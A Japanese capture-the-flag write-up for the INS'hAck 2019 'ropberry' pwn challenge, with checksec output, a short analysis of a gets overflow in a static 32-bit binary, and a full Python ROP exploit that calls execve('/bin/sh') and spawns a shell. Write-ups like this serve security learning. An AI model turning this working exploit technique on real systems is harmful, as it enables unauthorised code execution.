# [pwn 50pts] ropberry - INS'hAck 2019
32ビットでDEPは有効です。
```
$ checksec -f ropberry
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   2076 Symbols     Yes	4		52	ropberry
```

static linkですがnot strippedなので許す。
IDAで解析しましょう。
内容はgimme your shellと同じで、vuln関数の中でgetsを使っています。
static linkだからROP gadgetがいっぱいあるよ、ということでしょうか。

ROPでexecveしましょう。
残念ながら`/bin/sh`という文字列はバイナリ中になかったのでgetsで用意します。

```python
from ptrlib import *

sock = Process("./ropberry")

addr_gets = 0x08049af0
ptr_sh = 0x80ed000
rop_pop_eax = 0x080c1906
rop_pop_ebx = 0x080481ec
rop_pop_ecx = 0x080e394a
rop_pop_edx = 0x0805957a
rop_int80 = 0x08059d70

payload = b'A' * 0x8
payload += p32(addr_gets)
payload += p32(rop_pop_eax)
payload += p32(ptr_sh)
payload += p32(rop_pop_eax)
payload += p32(11)
payload += p32(rop_pop_ebx)
payload += p32(ptr_sh)
payload += p32(rop_pop_ecx)
payload += p32(0)
payload += p32(rop_pop_edx)
payload += p32(0)
payload += p32(rop_int80)

sock.recvuntil("president.\n")
sock.sendline(payload)

sock.sendline("/bin/sh\x00")

sock.interactive()
```

おしまい。
```
$ python solve.py 
[+] Process: Successfully created new process (PID=17574)
[ptrlib]$ id    
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
```

# 感想
x86のROPが久しぶりすぎてうっかりediを第一引数にしようとしてしまった。